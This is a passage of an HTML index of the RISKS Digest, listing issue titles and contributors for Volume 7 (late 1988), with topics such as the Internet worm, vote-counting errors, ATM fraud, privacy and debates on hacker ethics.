<LI><A HREF="/Risks/7.60.html#subj8">  This train didn't need a fireman (earl via Chuck Weinstock)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.61.html">Volume 7 Issue 61 (5 Oct 88 )</A>
<DD><UL>
<LI><A HREF="/Risks/7.61.html#subj1">  Program Verification: The very idea (Brian Randell)</A>
<LI><A HREF="/Risks/7.61.html#subj2">  RISKS of EPROMS (Daniel Klein)</A>
<LI><A HREF="/Risks/7.61.html#subj3">  Poor user interface -- police system (rpg)</A>
<LI><A HREF="/Risks/7.61.html#subj4">  Cash registers and tax (J Eric Townsend)</A>
<LI><A HREF="/Risks/7.61.html#subj5">  Re: Cash registers (PGN)</A>
<LI><A HREF="/Risks/7.61.html#subj6">  Fly-by-wire, absence thereof [MiG-29] (Henry Spencer) </A>
<LI><A HREF="/Risks/7.61.html#subj7">  Re: A New Portal For The Offensive -- FAX ATTACKS (Greeny)</A>
<LI><A HREF="/Risks/7.61.html#subj8">  Re: Is Uncle Sam selling your name to mailing lists? (Matthew Huntbach)</A>
<LI><A HREF="/Risks/7.61.html#subj9">  More on monitoring Cellular Phones (Mike Linnig)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.62.html">Volume 7 Issue 62 (7 Oct 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.62.html#subj1">  Re: Assault on Privacy (Anthony G. Atkielski)</A>
<LI><A HREF="/Risks/7.62.html#subj2">  Interesting article in PCW (Hugh Davies)</A>
<LI><A HREF="/Risks/7.62.html#subj3">  Bridge over troubled pseudo-random generation (PGN)</A>
<LI><A HREF="/Risks/7.62.html#subj4">  Reach Out and Touch Someone... for $650,000 (Henry Cox)</A>
<LI><A HREF="/Risks/7.62.html#subj5">  Computer Security and Voice Mail ... $150,000 (Davis)</A>
<LI><A HREF="/Risks/7.62.html#subj6">  Re: Risks of Cellular Phones (Wes Plouff)</A>
<LI><A HREF="/Risks/7.62.html#subj7">  Self-correcting (obliterating?) time (Jeffrey R Kell)</A>
<LI><A HREF="/Risks/7.62.html#subj8">  Risks in ATMs, Parking, Power outages (Steve Philipson)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.63.html">Volume 7 Issue 63 (10 Oct 88  )</A>
<DD><UL>
<LI><A HREF="/Risks/7.63.html#subj1">  Re: Killer terminals (Steve Wilson)</A>
<LI><A HREF="/Risks/7.63.html#subj2">  Can't Happen and Antilock Braking Systems    (Marcus Barrow and Robert Allen, via Mark Brader)
</A>
<LI><A HREF="/Risks/7.63.html#subj3">  ATM's credit check (Amos Shapir)</A>
<LI><A HREF="/Risks/7.63.html#subj4">  Dive Computers (Terry S. Arnold, Henry Spencer)</A>
<LI><A HREF="/Risks/7.63.html#subj5">  Emergency Access to Unlisted Telephone Numbers (Dave Wortman)</A>
<LI><A HREF="/Risks/7.63.html#subj6">  Re: Risks of Cellular Phones (Wes Plouff, Peter Robinson, Walter Doerr)</A>
<LI><A HREF="/Risks/7.63.html#subj7">  Computers, Copyright Law, and the Honor System (a talk) (Mark Mandel)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.64.html">Volume 7 Issue 64 (13 Oct 88  )</A>
<DD><UL>
<LI><A HREF="/Risks/7.64.html#subj1">  100 digit primes no longer safe in crypto (Dave Curry)</A>
<LI><A HREF="/Risks/7.64.html#subj2">  Risks of computer controlled doors (Piet van Oostrum)</A>
<LI><A HREF="/Risks/7.64.html#subj3">  NSFnet Backbone Shot (Gene Spafford)</A>
<LI><A HREF="/Risks/7.64.html#subj4">  Intersection of ANI and Voice Mail Risks (Gary McClelland)</A>
<LI><A HREF="/Risks/7.64.html#subj5">  New Feynman book (Eugene Miya)</A>
<LI><A HREF="/Risks/7.64.html#subj6">  High `Rev'ing Volvo (Hartel)</A>
<LI><A HREF="/Risks/7.64.html#subj7">  Stevie Wonder gives an Ear-itating Performance (Marshall Jose, PGN)</A>
<LI><A HREF="/Risks/7.64.html#subj8">  OMB "Blacklist"? (Hugh Miller)</A>
<LI><A HREF="/Risks/7.64.html#subj9">  Re: Ethics of Conflict Simulation (Scott Wilde)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.65.html">Volume 7 Issue 65 (15 Oct 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.65.html#subj1">  Vendor introduces "safe" Ada subset (Jonathan Jacky)</A>
<LI><A HREF="/Risks/7.65.html#subj2">  Re: ethics of conflict simulation (Sean Malloy)</A>
<LI><A HREF="/Risks/7.65.html#subj3">  Re: Assault on Privacy (Ronni Rosenberg)</A>
<LI><A HREF="/Risks/7.65.html#subj4">  Software warranties and Trade Practices in Australia     (B L Coombs annoted by "cbp", via Lee Naish)
</A>
<LI><A HREF="/Risks/7.65.html#subj5">  RISKS of EPROMS (George Sukenick)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.66.html">Volume 7 Issue 66 (20 Oct 88 )</A>
<DD><UL>
<LI><A HREF="/Risks/7.66.html#subj1">  British computer calls Northern Ireland a "Region Unknown" (John Murray)</A>
<LI><A HREF="/Risks/7.66.html#subj2">  "Brain" virus shows up in Hong Kong (Dave Horsfall)</A>
<LI><A HREF="/Risks/7.66.html#subj3">  A Credit Card Fraud (Brian Randell)</A>
<LI><A HREF="/Risks/7.66.html#subj4">  Nausea-inducing propellor (Mike Trout)</A>
<LI><A HREF="/Risks/7.66.html#subj5">  Re: Ear-itating performance (Jan Wolitzky, Ken Johnson)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.67.html">Volume 7 Issue 67 (25 Oct 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.67.html#subj1">  Unplugged Cable Plugs Orlando Traffic (Scot E Wilcoxon)</A>
<LI><A HREF="/Risks/7.67.html#subj2">  Airbus A320 in service (Henry Spencer)</A>
<LI><A HREF="/Risks/7.67.html#subj3">  Computer Literacy (Ronni Rosenberg)</A>
<LI><A HREF="/Risks/7.67.html#subj4">  Belgian PM's email tapped (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.67.html#subj5">  Police find hacker...and release him (Henry Cox)</A>
<LI><A HREF="/Risks/7.67.html#subj6">  Aegis user interface changes planned (Jon Jacky)</A>
<LI><A HREF="/Risks/7.67.html#subj7">  Programmable Hotel Locks (Allen J. Baum via John Rushby)</A>
<LI><A HREF="/Risks/7.67.html#subj8">  Nausea-inducing frequencies (David Chase)</A>
<LI><A HREF="/Risks/7.67.html#subj9">  Risks in Foundations of Numerical Analysis (John Cherniavsky)</A>
<LI><A HREF="/Risks/7.67.html#subj10">  Takeoff warning systems to be tested (Henry Cox)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.68.html">Volume 7 Issue 68 (31 Oct 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.68.html#subj1">  Conspiracy to Defraud (Martyn Thomas)</A>
<LI><A HREF="/Risks/7.68.html#subj2">  `Runaway' Computer Projects (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.68.html#subj3">  Perceived risk (James F. Carter)</A>
<LI><A HREF="/Risks/7.68.html#subj4">  "TCA pushes for privacy on corporate networks" (Jerry Leichter)</A>
<LI><A HREF="/Risks/7.68.html#subj5">  Risks in Answering Machines (Andy Glew)</A>
<LI><A HREF="/Risks/7.68.html#subj6">  Ear-itation (Ed Ravin)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.69.html">Volume 7 Issue 69 (3 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.69.html#subj1">  Virus on the Arpanet - Milnet (Cliff Stoll)</A>
<LI><A HREF="/Risks/7.69.html#subj2">  More on the virus (Gene Spafford, PGN, Matt Bishop)</A>
<LI><A HREF="/Risks/7.69.html#subj3">  A320 update (Robert Dorset via Steve Philipson)</A>
<LI><A HREF="/Risks/7.69.html#subj4">  Re: Conspiracy to Defraud (Dan Franklin)</A>
<LI><A HREF="/Risks/7.69.html#subj5">  Re: Telephone answering machines (Vince Manis)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.70.html">Volume 7 Issue 70 (3 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.70.html#subj1">  Updated worm report (Gene Spafford)</A>
<LI><A HREF="/Risks/7.70.html#subj2">  A worm "condom" (Gene Spafford)</A>
<LI><A HREF="/Risks/7.70.html#subj3">  A cure!!!!! (Gene Spafford)</A>
<LI><A HREF="/Risks/7.70.html#subj4">  Computer Network Disrupted by `Virus' (John Markoff via Geoff Goodfellow)</A>
<LI><A HREF="/Risks/7.70.html#subj5">  "Annals of Democracy -- Counting Votes" in the New Yorker (Daniel B Dobkin)</A>
<LI><A HREF="/Risks/7.70.html#subj6">  Comments on the New Yorker article (PGN)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.71.html">Volume 7 Issue 71 (6 Nov 88 )</A>
<DD><UL>
<LI><A HREF="/Risks/7.71.html#subj1">  Send us your Arpanet Virus War Stories (Cliff Stoll)</A>
<LI><A HREF="/Risks/7.71.html#subj2">  Suspect in Virus Case (Brian M. Clapper)</A>
<LI><A HREF="/Risks/7.71.html#subj3">  Internet Virus (Mark W. Eichin)</A>
<LI><A HREF="/Risks/7.71.html#subj4">  RISKS of getting opinions from semi-biased sources (Brad Templeton, PGN)</A>
<LI><A HREF="/Risks/7.71.html#subj5">  Worm/virus mutations (David A. Honig, PGN)</A>
<LI><A HREF="/Risks/7.71.html#subj6">  Worm sending messages to ernie.berkeley.edu? (Jacob Gore)</A>
<LI><A HREF="/Risks/7.71.html#subj7">  Re: "UNIX" Worm/virus (Peter da Silva)</A>
<LI><A HREF="/Risks/7.71.html#subj8">  Comments on vote counting ("Bill Stewart and/or Shelley Rosenbaum")</A>
<LI><A HREF="/Risks/7.71.html#subj9">  Re: A320 update (Henry Spencer)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.72.html">Volume 7 Issue 72 (8 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.72.html#subj1">  The Worm/Virus -- and an Unlearned Lesson (PGN)</A>
<LI><A HREF="/Risks/7.72.html#subj2">  Airline Reservation System Vulnerabilities (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.72.html#subj3">  Computers in the oldest profession (Dave Horsfall)</A>
<LI><A HREF="/Risks/7.72.html#subj4">  Auto Privacy (Dave Robinson)</A>
<LI><A HREF="/Risks/7.72.html#subj5">  Computer science unencumbered by fears about cutting safety margins    (Jeffrey Mogul)
</A>
<LI><A HREF="/Risks/7.72.html#subj6">  Re: Risks in Answering Machines (revisited)    (Amos Shapir, Gordon Meyer, Bob Felderman, Greeny, William Curtiss)
</A>
<LI><A HREF="/Risks/7.72.html#subj7">  Re: CRT noise (Ed Ravin, Geoffrey Welsh)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.73.html">Volume 7 Issue 73 (9 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.73.html#subj1">  The Computer Jam -- How it came about (John Markoff via Geoff Goodfellow)</A>
<LI><A HREF="/Risks/7.73.html#subj2">  Single-bit error transmogrifications (Robert D. Houk)</A>
<LI><A HREF="/Risks/7.73.html#subj3">  New news from Hacker attack on Philips France, 1987 (Klaus Brunnstein)</A>
<LI><A HREF="/Risks/7.73.html#subj4">  Re: Telephone answering machines (William Curtiss)</A>
<LI><A HREF="/Risks/7.73.html#subj5">  Fly by Light (Martyn Thomas)</A>
<LI><A HREF="/Risks/7.73.html#subj6">  WORM/VIRUS DICUSSION:</A>
<LI><A HREF="/Risks/7.73.html#subj7">  Decompiled viruses (Dave Pare)</A>
<LI><A HREF="/Risks/7.73.html#subj8">  Worms/viruses/moles/etc. and the risk of nuclear war (Clifford Johnson)</A>
<LI><A HREF="/Risks/7.73.html#subj9">  The Worm (Vince Manis)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.74.html">Volume 7 Issue 74 (10 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.74.html#subj1">  Air traffic control and safety margins (Steve Philipson)</A>
<LI><A HREF="/Risks/7.74.html#subj2">  UK vehicle-identification systems (Chaz Heritage)</A>
<LI><A HREF="/Risks/7.74.html#subj3">  Re: The Computer Jam -- How it came about (Mark W. Eichin)</A>
<LI><A HREF="/Risks/7.74.html#subj4">  The worm and the debug option (Steven Bellovin)</A>
<LI><A HREF="/Risks/7.74.html#subj5">  Risks of unchecked input in C programs (Geoff Collyer)</A>
<LI><A HREF="/Risks/7.74.html#subj6">  Worms/viruses/moles/etc. and the risks (Scott E. Preece)</A>
<LI><A HREF="/Risks/7.74.html#subj7">  Nonsecure passwords/computer ethics (Christine Piatko, PGN)</A>
<LI><A HREF="/Risks/7.74.html#subj8">  Phone-answerer/ voicemail security &amp; voice-encryption (David A. Honig)</A>
<LI><A HREF="/Risks/7.74.html#subj9">  University computing (James A. Schweitzer)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.75.html">Volume 7 Issue 75 (11 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.75.html#subj1">  Re: Risks of unchecked input in C programs (Bob Frankston)</A>
<LI><A HREF="/Risks/7.75.html#subj2">  NY Computer Laws and the Internet Worm (Dave Bozak)</A>
<LI><A HREF="/Risks/7.75.html#subj3">  Ethics (Stan Stahl, Christine Piatko)</A>
<LI><A HREF="/Risks/7.75.html#subj4">  Comments sought on proposed computer ethics course (Bob Barger)</A>
<LI><A HREF="/Risks/7.75.html#subj5">  UK vehicle-identification systems (Douglas Jones)</A>
<LI><A HREF="/Risks/7.75.html#subj6">  UK vehicle-id systems... Big Brother's new eyes? (Mike Hadjimichael)</A>
<LI><A HREF="/Risks/7.75.html#subj7">  Re: Phone-answerer/ voicemail security &amp; voice-encryption (Jonathan Kamens)</A>
<LI><A HREF="/Risks/7.75.html#subj8">  Re: Ultrasonic emissions a real problem (Travis Lee Winfrey)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.76.html">Volume 7 Issue 76 (12 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.76.html#subj1">  Computer Literacy #2 (Ronni Rosenberg)</A>
<LI><A HREF="/Risks/7.76.html#subj2">  A Report on the Internet Worm (Bob Page in VIRUS-L)</A>
<LI><A HREF="/Risks/7.76.html#subj3">  NSA attempts to restrict virus information (Jon Jacky)</A>
<LI><A HREF="/Risks/7.76.html#subj4">  Who is responsible for the sendmail fiasco? (Bob Frankston)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.77.html">Volume 7 Issue 77 (14 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.77.html#subj1">WORM/VIRUS:</A>
<LI><A HREF="/Risks/7.77.html#subj2">  UNIX InSecurity (beyond the Virus-Worm) (Klaus Brunnstein)</A>
<LI><A HREF="/Risks/7.77.html#subj3">  Unauthorized Access (Dennis G. Rears)</A>
<LI><A HREF="/Risks/7.77.html#subj4">  re: NY Computer Laws and the Internet Worm (Forrest Colliver)</A>
<LI><A HREF="/Risks/7.77.html#subj5">  Re: NSA attempts to restrict virus information (Steven Bellovin)</A>
<LI><A HREF="/Risks/7.77.html#subj6">  Risks of unchecked input in C programs (Bill Stewart, Bob Frankston)</A>
<LI><A HREF="/Risks/7.77.html#subj7">  Worms &amp; Ethics (Don Wegeng)</A>
<LI><A HREF="/Risks/7.77.html#subj8">  One count, or multiple counts? (Richard Wiggins)</A>
<LI><A HREF="/Risks/7.77.html#subj9">  The RISKS of jargon (Dave Horsfall)</A>
<LI><A HREF="/Risks/7.77.html#subj10">OTHER CONTRIBUTIONS:</A>
<LI><A HREF="/Risks/7.77.html#subj11">  University of Surrey Hacker (Brian Randell)</A>
<LI><A HREF="/Risks/7.77.html#subj12">  Re: UK vehicle-identification systems (Steven C. Den Beste, Franklin Davis)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.78.html">Volume 7 Issue 78 (15 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.78.html#subj1">  Computers in Elections (PGN)</A>
<LI><A HREF="/Risks/7.78.html#subj2">  Risks in econometric models (Ross Miller)</A>
<LI><A HREF="/Risks/7.78.html#subj3">  Report on SAFECOMP '88 [long] (Tim Shimeall)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.79.html">Volume 7 Issue 79 (16 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.79.html#subj1">  Vote Count Error(Kenneth R Jongsma)</A>
<LI><A HREF="/Risks/7.79.html#subj2">  Computer Ethics Class (Leslie Chalmers)</A>
<LI><A HREF="/Risks/7.79.html#subj3">  Teaching "Ethics" (Eric Roskos)</A>
<LI><A HREF="/Risks/7.79.html#subj4">  Re: NSA attempts to restrict virus information (Theodore Ts)</A>
<LI><A HREF="/Risks/7.79.html#subj5">  The FBI Wants You (if you were virus-ized) (Tom Zmudzinski via Dave Curry)</A>
<LI><A HREF="/Risks/7.79.html#subj6">  Access and authorization (Joe Morris)</A>
<LI><A HREF="/Risks/7.79.html#subj7">  Laws of computer evidence (Barry C. Nelson)</A>
<LI><A HREF="/Risks/7.79.html#subj8">  Call for comments on uniformity legislation for software    (Conleth S. O'Connell via Alan Kaminsky)
</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.80.html">Volume 7 Issue 80 (18 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.80.html#subj1">  Computer glitch causes Fresno `flood' (Ira Greenberg via PGN)</A>
<LI><A HREF="/Risks/7.80.html#subj2">  Election Computing (PGN)</A>
<LI><A HREF="/Risks/7.80.html#subj3">  Re: Vote Count Error (Brint Cooper)</A>
<LI><A HREF="/Risks/7.80.html#subj4">  Casiers numeriques!  (Digital lockers!) (Marc Vilain)</A>
<LI><A HREF="/Risks/7.80.html#subj5">  Re: Toll Road information collection (David Phillip Oster)</A>
<LI><A HREF="/Risks/7.80.html#subj6">  Risks of non-technologists' reactions to technological failures    (Fred McCall on Al Fasoldt)
</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.81.html">Volume 7 Issue 81 (21 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.81.html#subj1">  Computerized voting problems in Toronto (Amit Parghi)</A>
<LI><A HREF="/Risks/7.81.html#subj2">  NH State Republican Convention Computerized Voting Standard (Kurt Hyde)</A>
<LI><A HREF="/Risks/7.81.html#subj3">  Ethics (Hugh Miller)</A>
<LI><A HREF="/Risks/7.81.html#subj4">  Re: Teaching "Ethics" (Brint Cooper)</A>
<LI><A HREF="/Risks/7.81.html#subj5">  Decompiled Source (Phil Karn)</A>
<LI><A HREF="/Risks/7.81.html#subj6">  Re: Risks of unchecked input in C programs (Henry Spencer)</A>
<LI><A HREF="/Risks/7.81.html#subj7">  Smart Roads (Robert Brooks)</A>
<LI><A HREF="/Risks/7.81.html#subj8">  IFF &amp; UK Toll Roads (Nigel Roberts)</A>
<LI><A HREF="/Risks/7.81.html#subj9">  Re: "Electronic number plates" (Allan Pratt)</A>
<LI><A HREF="/Risks/7.81.html#subj10">  Re: UK vehicle-identification systems (John Haller)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.82.html">Volume 7 Issue 82 (23 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.82.html#subj1">  Troubles with automatic vote counting in Toronto (Mark Brader)</A>
<LI><A HREF="/Risks/7.82.html#subj2">  Risks of remote registration (anonymous)</A>
<LI><A HREF="/Risks/7.82.html#subj3">  The risks of using CACM inserts (Eric Hughes)</A>
<LI><A HREF="/Risks/7.82.html#subj4">  Computer Breakin article [San Antonio] (Maj. Doug Hardie)</A>
<LI><A HREF="/Risks/7.82.html#subj5">  Ethics and Software (Brian Kahin via Ezra Zubrow and Bruce O'Neel)</A>
<LI><A HREF="/Risks/7.82.html#subj6">  Teaching Children Ethics (Homer W. Smith)</A>
<LI><A HREF="/Risks/7.82.html#subj7">  Re: toll road speed checking (Brent Laminack)</A>
<LI><A HREF="/Risks/7.82.html#subj8">  Privacy vs UK vehicle-identification systems (Andrew Klossner)</A>
<LI><A HREF="/Risks/7.82.html#subj9">  RightTouch service (Scott C. Crumpton)</A>
<LI><A HREF="/Risks/7.82.html#subj10">  Cordless Telephones (Walker)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.83.html">Volume 7 Issue 83 (28 Nov 88 19:17:04 PST)</A>
<DD><UL>
<LI><A HREF="/Risks/7.83.html#subj1">  Tech Report on the Internet Worm (Gene Spafford, PGN)</A>
<LI><A HREF="/Risks/7.83.html#subj2">  Congress plans hearings on the Internet Worm (Jon Jacky)</A>
<LI><A HREF="/Risks/7.83.html#subj3">  Computer Literacy #3 (Ronni Rosenberg)</A>
<LI><A HREF="/Risks/7.83.html#subj4">  More on misuses of computers (PGN)</A>
<LI><A HREF="/Risks/7.83.html#subj5">  Chain letters = next net disaster ? (Ira Baxter)</A>
<LI><A HREF="/Risks/7.83.html#subj6">  Computerized Parking Meters (James Peterson)</A>
<LI><A HREF="/Risks/7.83.html#subj7">  Data verification (Rob Gross)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.84.html">Volume 7 Issue 84 (29 Nov 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.84.html#subj1">  "Program Verification: The Very Idea", by J.H. Fetzer (Nancy Leveson et al.)</A>
<LI><A HREF="/Risks/7.84.html#subj2">  Internet Worm Tech Report (Gene Spafford) [Risks of Offering Popular Reports]</A>
<LI><A HREF="/Risks/7.84.html#subj3">  Purchasers of computer systems as causes of the Internet worm    (Brandon S. Allbery)
</A>
<LI><A HREF="/Risks/7.84.html#subj4">  Bank of America ATMs Hit a Glitch (PGN)</A>
<LI><A HREF="/Risks/7.84.html#subj5">  Corps of Software Engineers? (Henry Spencer)</A>
<LI><A HREF="/Risks/7.84.html#subj6">  Software Uniformity Legislation (Colin M Thomson)</A>
<LI><A HREF="/Risks/7.84.html#subj7">  Zapping shoplifters in Minnesota (Scot E Wilcoxon)</A>
<LI><A HREF="/Risks/7.84.html#subj8">  (Counter-)corrective control systems (Jeffrey R Kell)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.85.html">Volume 7 Issue 85 (1 Dec 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.85.html#subj1">  Security Pacific Automated Teller Theft  (PGN and Stan Stahl)</A>
<LI><A HREF="/Risks/7.85.html#subj2">  Re: Corps of Software Engineers? (Dave Parnas)</A>
<LI><A HREF="/Risks/7.85.html#subj3">  Telecommunications, Data Entry and Worker Exploitation (Larry Hunter)</A>
<LI><A HREF="/Risks/7.85.html#subj4">  Milnet Isolation (John Markoff via Geoff Goodfellow)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.86.html">Volume 7 Issue 86 (3 Dec 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.86.html#subj1">  Mix-up Impedes Romance (Kevyn Collins-Thompson)</A>
<LI><A HREF="/Risks/7.86.html#subj2">  California Lotto computer crash (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.86.html#subj3">  Telecommunications, Data Entry, ... - and "Security" (Henry Schaffer)</A>
<LI><A HREF="/Risks/7.86.html#subj4">  Re: Toll Road information collection (Dave Nedde)</A>
<LI><A HREF="/Risks/7.86.html#subj5">  Manufacturers' responsibilities for security (Keith Hanlan)</A>
<LI><A HREF="/Risks/7.86.html#subj6">  Computer Malpractice (David J. Farber)</A>
<LI><A HREF="/Risks/7.86.html#subj7">  Interesting Sidebar on worm and liability (Charles J. Wertz)</A>
<LI><A HREF="/Risks/7.86.html#subj8">  Unfortunate Use of Term "cracker" (T. Andrews)</A>
<LI><A HREF="/Risks/7.86.html#subj9">  Re: "crackers" and "Crackers", " 'jackers", and "snackers" (PGN)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.87.html">Volume 7 Issue 87 (5 Dec 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.87.html#subj1">  Value for money? (Jerry Harper)</A>
<LI><A HREF="/Risks/7.87.html#subj2">  Corps of Software Engineers (Gary Chapman)</A>
<LI><A HREF="/Risks/7.87.html#subj3">  DEC Enet and "denial of service" attacks (Willie Smith)</A>
<LI><A HREF="/Risks/7.87.html#subj4">  Re: Nonsecure passwords/computer ethics ( /dev/*mem and superuser )    (Paul E. McKenney, Kendall Collett, PGN)
</A>
<LI><A HREF="/Risks/7.87.html#subj5">  "Hackers,"  "crackers,"  "snackers,"  and ethics    (Frank Maginnis, PGN, FM, Darrell Long, Alex Colvin)
</A>
<LI><A HREF="/Risks/7.87.html#subj6">  Computer Risks Revisited (John Markoff)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.88.html">Volume 7 Issue 88 (6 Dec 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.88.html#subj1">  Summary of Software Uniformity Legislation issue (Conleth OConnell)</A>
<LI><A HREF="/Risks/7.88.html#subj2">  Exploiting workers (Dale Worley)</A>
<LI><A HREF="/Risks/7.88.html#subj3">  Re: Automated teller theft (Dr Robert Frederking)</A>
<LI><A HREF="/Risks/7.88.html#subj4">  Speeding detectors (Dave Horsfall)</A>
<LI><A HREF="/Risks/7.88.html#subj5">  Report of hardware "virus" on chips (Gary Chapman)</A>
<LI><A HREF="/Risks/7.88.html#subj6">  Re: Corps of Software Engineers? (Richard Rosenthal)</A>
<LI><A HREF="/Risks/7.88.html#subj7">  Vendor Liability, and "Plain Vanilla" configurations (Bob Estell)</A>
<LI><A HREF="/Risks/7.88.html#subj8">  Talk by Tom Blake on Computer Fraud (Mark Mandel)</A>
<LI><A HREF="/Risks/7.88.html#subj9">  Defining "hackers and crackers" (Gordon Meyer)</A>
<LI><A HREF="/Risks/7.88.html#subj10">  RISKS OF GREATER GARBLE (somewhere in netland)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.89.html">Volume 7 Issue 89 (6 Dec 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.89.html#subj1">  Computer Literacy #4 (Ronni Rosenberg)</A>
<LI><A HREF="/Risks/7.89.html#subj2">  Privacy versus honesty/equality (Jerry Carlin)</A>
<LI><A HREF="/Risks/7.89.html#subj3">  Computerized speeding tickets? (Clifford Johnson)</A>
<LI><A HREF="/Risks/7.89.html#subj4">  Subways that "know" who's on board (Marc J Balcer)</A>
<LI><A HREF="/Risks/7.89.html#subj5">  Automatic toll systems -- Dallas (Andrew R. MacBride)</A>
<LI><A HREF="/Risks/7.89.html#subj6">  "Hackers", "crackers", "snackers", and ethics ("Maj. Doug Hardie")</A>
<LI><A HREF="/Risks/7.89.html#subj7">  `hacker' is already a dictionary entry (Joe Morris, Douglas Jones)</A>
<LI><A HREF="/Risks/7.89.html#subj8">  Re: /dev/*mem and superuser (Jeff Makey)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.90.html">Volume 7 Issue 90 (8 Dec 88)</A>
<DD><UL>
<LI><A HREF="/Risks/7.90.html#subj1">  "Glass cockpit" syndrome / Vincennes (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.90.html#subj2">  VDTs and premature loss of ability to focus eyes (Rodney Hoffman)</A>
<LI><A HREF="/Risks/7.90.html#subj3">  NEW YORK TIMES reviews novel about computer sabotage (Jon Jacky)</A>
<LI><A HREF="/Risks/7.90.html#subj4">  "hacker" et al. (RAMontante, Russ Nelson, Douglas Monk,     Andrew Klossner, Kenneth Siani, Don Mac Phee)
</A>
<LI><A HREF="/Risks/7.90.html#subj5">  Unquestioning belief in expert testimony (Matt Bishop)</A>
</UL><DT><IMG SRC="/Images/redball.gif" ALT=p"o" WIDTH="14" HEIGHT="14">
<A HREF="/Risks/7.91.html">Volume 7 Issue 91 (11 Dec 88)</A>
<DD><UL>
